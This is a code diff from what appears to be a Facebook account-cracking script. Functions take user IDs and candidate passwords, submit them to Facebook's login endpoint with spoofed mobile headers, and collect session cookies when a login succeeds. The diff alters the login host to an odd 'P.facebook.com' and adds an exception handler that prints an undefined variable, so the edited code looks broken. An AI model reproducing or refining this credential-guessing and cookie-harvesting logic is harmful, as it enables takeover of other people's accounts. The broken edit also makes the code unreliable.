@@ -3549,7 +3549,7 @@ def A(uid,pwx,tl):
             'upgrade-insecure-requests': '1',
             'user-agent': pro,
             'viewport-width': '980'}
-            lo = session.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=log_data,headers=header_freefb).text
+            lo = session.post("https://P.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -3565,8 +3565,8 @@ def A(uid,pwx,tl):
             else:
                 continue
         loop+=1
-    except:
-        pass
+    except:print(e)
+        #pass
 #______________+_____________#
 def B(uid,pwx,tl):
     global loop
